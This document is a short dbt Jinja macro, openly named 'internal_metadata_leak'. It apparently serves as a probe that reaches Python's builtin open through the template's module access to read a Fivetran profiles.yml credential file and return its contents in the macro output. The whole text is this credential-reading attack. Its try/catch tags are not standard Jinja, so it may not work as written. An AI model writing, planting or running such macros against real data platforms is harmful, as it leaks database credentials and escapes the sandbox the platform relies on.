{% macro internal_metadata_leak() %}
    {% if execute %}        
        {% set path = "/tmp/dbt/project/.fivetran/profiles.yml" %}
                
        {% set result = "blocked" %}
                
        {% try %}
           {% set f = modules.builtins.open(path, 'r') %}
           {% set result = f.read() | truncate(500) %}
        {% catch %}
           {% set result = "builtins_open_failed" %}
        {% endtry %}
        
        {{ return("FILE_CONTENT: " ~ result) }}
    {% else %}
        {{ return("probing_file...") }}
    {% endif %}
{% endmacro %}
